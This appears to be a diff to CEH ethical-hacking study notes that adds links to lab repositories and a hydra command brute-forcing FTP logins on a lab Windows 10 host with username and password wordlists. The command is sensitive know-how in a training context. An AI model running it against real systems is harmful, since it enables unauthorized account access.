@@ -14,4 +14,7 @@ https://github.com/TheCyberpunker/CEH-Practical-Notes/blob/main/8%20-%20CEH-Note
 
 https://github.com/Samsar4/Ethical-Hacking-Labs
 
+For FTP brute force:
+
+hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://[IP Address of Windows 10] 
 
